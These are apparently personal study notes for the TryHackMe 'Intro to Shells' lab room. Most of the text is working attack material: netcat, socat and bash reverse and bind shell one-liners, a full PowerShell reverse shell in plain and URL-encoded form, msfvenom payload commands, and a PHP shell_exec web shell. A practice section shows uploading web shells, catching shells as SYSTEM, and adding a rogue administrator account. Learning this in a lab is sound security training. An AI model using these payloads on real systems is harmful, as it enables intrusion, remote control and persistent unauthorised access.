# Room
https://tryhackme.com/room/introtoshells

# Task 1 - What is a shell?
## Shell Programs
* Linux: sh, bash
* Windows: cmd, powershell
## Shell Types
* Reverse - target connects back to you
* Bind - target opens a port for you to connect to it

# Task 2 - Tools
* netcat - used for reverse and bind shells
* socat - more powerful version of netcat, stable
* metasploit multi/handler - reverse and bind shells, meterpreter shell, payload staging
* msfvenom - create payloads for reverse and bind shells

# Task 3 - Types of Shell
* Reverse - target connects back to your listener
    * Local: sudo nc -nvlp 8888
    * Remote: nc [local_ip] 8888 -e /bin/bash
* Bind - target opens a port for you to connect to
    * Remote: sudo nc -nvlp 8888 -e /bin/bash
    * Local: nc [remote_ip] 8888
* Interactive VS Non-Interactive shells - Interactive shells are the standard experience you are used to when using bash or powershell, you can run all commands, etc.  Non-Interactive shells only allow you to run commands successfully that do not require input, such as ls or dir, commands that require input would not work, such as sudo -l

# Task 4 - Netcat
## Reverse Shell
* sudo nc -nvlp [local_port]
    * -n - don't resolve with DNS
    * -v - verbose
    * -l - create a listener
    * -p - use the following port
    * [local_port] - the port for incoming connections
## Bind Shell
* nc [remote_ip] [remote_port]
    * [remote_ip] - IP that has a listener
    * [remote_port] - port open on the listener

# Task 5 - Netcat Shell Stabalization
Netcat shells aren't stable and are non-interactive by default
* Stabilize with Python
    * upgrade to bash - python -c 'import pty;pty.spawn("/bin/bash")
    * upgrade to term commands - export TERM=xterm
    * upgrade to autocomplete, etc - CTRL+Z, stty raw -echo; fg
    * if the shell dies, type reset and then enter
* Stabilize with rlwrap
    * install first - sudo apt install rlwrap
    * to use - sudo rlwrap nc -nvlp [local_port]
* Stabilize with Socat
    * use netcat to get an initial shell
    * host socat - sudo python3 -m http.server 80
    * transfer socat - wget http://[remote_ip]/socat -O /tmp/socat
    * go through socat setup process to upgrade to that shell
* Change terminal tty size
    * make note of rows and columns - stty -a
    * update rows using number above - stty rows [number]
    * update columns using number above - stty cols [number]
    * changing these values allow text editors and other tools to display properly

# Task 6 - Socat
Provides a link between two points
## Reverse Shell
* Local: socat TCP-L:[local_port] -
* Remote (Windows): socat TCP:[local_ip]:[local_port] EXEC:powershell.exe,pipes
    * pipes forces powershell to use Unix standard IO
* Remote (Linux): socat TCP:[local_ip]:[local_port] EXEC:"bash -li"
## Bind Shell
* Remote (Linux): socat TCP-L:[remote_port] EXEC:"bash -li"
* Remote (Windows): socat TCP-L:[remote_port] EXEC:powershell.exe,pipes
* Local: socat TCP:[remote_ip]:[remote_port] -
## Stable Reverse Shell
* Local: socat TCP-L:[local] FILE:\`tty`,raw,echo=0
* Remote: socat TCP:[local_ip]:[local_port] EXEC:"bash -li",pty,stderr,sigint,setsid,sane
* This shell only works when the target is using Linux

# Task 7 - Socat Encrypted Shells
You can encrypt your shell with socat
* Prep work before using an encrypted shell
    * generate a cert on the attacking machine
        * openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
    * merge key and cert to pem
        * cat shell.key shell.crt > shell.pem
* Reverse Shell encrypted
    * Local: socat OPENSSL-LISTEN:[local_port],cert=shell.pem,verify=0 -
        * verify 0 ignores cert validation
    * Remote: socat OPENSSL:[local_ip]:[local_port],verify=0 EXEC:/bin/bash
* Bind Shell encrypted
    * transfer cert to remote
    * Remote: socat OPENSSL-LISTEN:[remote_port],cert=shell.pem,verify=0 EXEC:cmd.exe,pipes
    * Local: socat OPENSSL:[remote_ip]:[remote_port],verify=0 -

# Task 8 - Common Shell Payloads
* The nc -e option allows you to execute a program, but -e is not a part of most versions of netcat
* Bind Shell
    * nc -nvlp [local_port] -e /bin/bash
* Reverse Shell
    * nc [remote_ip] [remote_port] -e /bin/bash
* Linux alternatives using mkfifo
    * Bind Shell
        * mkfifo /tmp/f; nc -nvlp [local_port] < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
    * Reverse Shell
        * mkfifo /tmp/f; nc [remote_ip] [remote_port] < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
* Windows PowerShell
    * Reverse Shell
        * powershell -c "$client = New-Object System.Net.Sockets.TCPClient('[remote_ip]',[remote_port]);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

# Task 9 - msfvenom
Payloads
* Basic syntax: msfvenom -p [payload] [options]
* Example for Windows x64 reverse shell
    * msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=[local_ip] LPORT=[local_port]
        * -f - output format
        * -o - output file
        * LHOST - IP that you want the payload to connect to
        * LPORT - port that LHOST is listening on
* Staged vs Stageless
    * Staged - two parts, one - a stager whose job is to transfer the payload, two - a payload that contains code that will execute on the target to build the shell
    * Stageless - one piece of code that when executed builds the shell
* Meterpreter
    * Stable
    * Full featured
    * Must be used in Metasploit
* Naming convention : OS/ARCH/PAYLOAD
* Staged Example : windows/x64/meterpreter_reverse_tcp
* Stageless Example : linux/x86/shell_reverse_tcp

# Task 10 - Metasploit multi/handler
Catches reverse shells, required for Metasploit shells
* To use: msfconsole, use multi/handler
* Set options
    * lhost - local interface to listen on, eth0, tun0, etc
    * lport - port to use for the listener
    * payload - must match the connecting shell
* Launch
    * Foreground: exploit
    * Background: exploit -j
* Sessions and Backgrounding
    * To background your current session type: background
    * To list background sessions type: sessions
    * To connect to a background session type: sessions [number]

# Task 11 - WebShells
A Webshell runs on a web server through a web page via HTML form or another frontend interface
* Basic PHP Webshell
    * ```<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>```
    * Any commands we enter in the URL after ?cmd= will be executed on the host
* Example URL Encoded PowerShell Reverse Shell
    * ```powershell%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%27<IP>%27%2C<PORT>%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22```
    * You still must change the IP and port and encode it properly
    * Encoder/decoder : https://www.urldecoder.org/

# Task 12 - Next Steps
Research your target OS fully

# Task 13 - Practice and Examples

* Linux Webshell

    Local listener
    ```
    nc -nvlp 9999
    listening on [any] 9999 ...
    ```
    Webshell code
    ```
    cat webshell.php
    <?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>
    ```
    Upload webshell.php and navigate to the URL
    ```
    http://a.b.c.d/uploads/webshell.php
    ```
    Test Webshell functionality
    ```
    curl http://a.b.c.d/uploads/webshell.php?cmd=ls
    <pre>webshell.php
    ```
    Try getting a shell, establish your nc command
    ```
    nc e.f.g.h 9999 -e /bin/bash
    ```
    Encode your nc command
    ```
    https://www.urlencoder.org/

    The above nc command turns into:
    nc%20e.f.g.h%209999%20-e%20%2Fbin%2Fbash
    ```
    Execute your nc command
    ```
    curl http://a.b.c.d/uploads/webshell.php?cmd=nc%20e.f.g.h%209999%20-e%20%2Fbin%2Fbash
    ```
    Check your listener
    ```
    nc -nvlp 9999
    listening on [any] 9999 ...
    connect to [e.f.g.h] from (UNKNOWN) [a.b.c.d] 41982
    whoami
    www-data
    ```

* Linux PHP Reverse Shell

    Local listener
    ```
    nc -nvlp 1234
    listening on [any] 1234 ...
    ```
    Grab local copy of php-reverse-shell.php
    ```
    cp /usr/share/webshells/php/php-reverse-shell.php .
    ```
    Edit the $ip and $port lines
    ```
    $ip = '127.0.0.1';  // CHANGE THIS
    $port = 1234;       // CHANGE THIS
    ```
    Upload php-reverse-shell.php and navigate to the URL
    ```
    http://a.b.c.d/uploads/php-reverse-shell.php
    ```
    Check your listener
    ```
    nc -nvlp 1234
    listening on [any] 1234 ...
    connect to [e.f.g.h] from (UNKNOWN) [a.b.c.d] 39426
    Linux linux-shell-practice 4.15.0-117-generic #118-Ubuntu SMP Fri Sep 4 20:02:41 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
    00:08:40 up 3 min,  0 users,  load average: 0.08, 0.15, 0.07
    USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
    uid=33(www-data) gid=33(www-data) groups=33(www-data)
    /bin/sh: 0: can't access tty; job control turned off
    $ whoami
    www-data
    ```

* Linux Netcat Bind Shell

    Remote listener
    ```
    shell@linux-shell-practice:~$ nc -nvlp 4567 -e /bin/sh
    listening on [any] 4567 ...
    ```
    Local connection
    ```
    nc e.f.g.h 4567
    whoami
    shell
    ```

* Linux Netcat Reverse Shell

    Local listener
    ```
    nc -nvlp 8787
    listening on [any] 8787 ...
    ```
    Remote connection
    ```
    Using: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#bash-tcp

    bash -i >& /dev/tcp/a.b.c.d/8787 0>&1
    ```
    Check listener
    ```
    nc -nvlp 8787
    listening on [any] 8787 ...
    connect to [a.b.c.d] from (UNKNOWN) [e.f.g.h] 52772
    shell@linux-shell-practice:~$ whoami
    whoami
    shell
    shell@linux-shell-practice:~$ 
    ```

* Linux Socat Bind Shell

    Remote listener
    ```
    shell@linux-shell-practice:~$ socat TCP-L:9876 EXEC:"bash -li"
    ```
    Local connection
    ```
    box:~$socat TCP:e.f.g.h:9876 -
    whoami
    shell
    ```

* Linux Socat Reverse Shell

    Local listener
    ```
    socat TCP-L:3333 -
    ```
    Remote connection
    ```
    shell@linux-shell-practice:~$ socat TCP:a.b.c.d:3333 EXEC:"bash -li"
    ```
    Check listener
    ```
    socat TCP-L:3333 -
    whoami
    shell
    ```

* Windows PHP Reverse Shell

    Local listener
    ```
    nc -nvlp 1234
    ```
    Create basic Webshell
    ```
    echo '<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>' > bshell.php
    
    cat bshell.php 
    <?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>
    ```
    Upload Webshell and test it
    ```
    curl http://e.f.g.h/uploads/bshell.php?cmd=dir
    <pre> Volume in drive C has no label.
    Volume Serial Number is 54F3-FF2D

    Directory of C:\xampp\htdocs\uploads

    21/01/2021  01:17    <DIR>          .
    21/01/2021  01:17    <DIR>          ..
    21/01/2021  01:17                61 bshell.php
                1 File(s)             61 bytes
                2 Dir(s)   4,095,086,592 bytes free
    ```
    Grab powershell payload and encode it with remote IP and port
    ```
    Use https://www.urldecoder.org/

    Generic payload
    powershell%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%27<IP>%27%2C<PORT>%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22
    ```
    Execute payload via your Webshell
    ```
    curl http://e.f.g.h/uploads/bshell.php?cmd=powershell%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%27a.b.c.d%27%2C1234%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22

    ```
    Check listener
    ```
    nc -nvlp 1234
    listening on [any] 1234 ...
    connect to [a.b.c.d] from (UNKNOWN) [e.f.g.h] 49755
    whoami
    nt authority\system
    PS C:\xampp\htdocs\uploads> 
    ```

* Windows create user for remote login

    Add user
    ```
    PS C:\xampp\htdocs\uploads> net user tester tester /add
    The command completed successfully.
    ```
    Add user to group
    ```
    PS C:\xampp\htdocs\uploads> net localgroup administrators tester /add
    The command completed successfully.
    ```

* Windows Netcat Bind Shell

    Remote listener
    ```
    PS C:\tools> .\nc.exe -nvlp 8787 -e c:\windows\system32\cmd.exe
    listening on [any] 8787 ...
    connect to [a.b.c.d] from (UNKNOWN) [e.f.g.h] 36500
    ```
    Local connection
    ```
    nc e.f.g.h 8787
    Microsoft Windows [Version 10.0.17763.1637]
    (c) 2018 Microsoft Corporation. All rights reserved.

    C:\tools>whoami
    whoami
    win-shells\tester

    C:\tools>
    ```

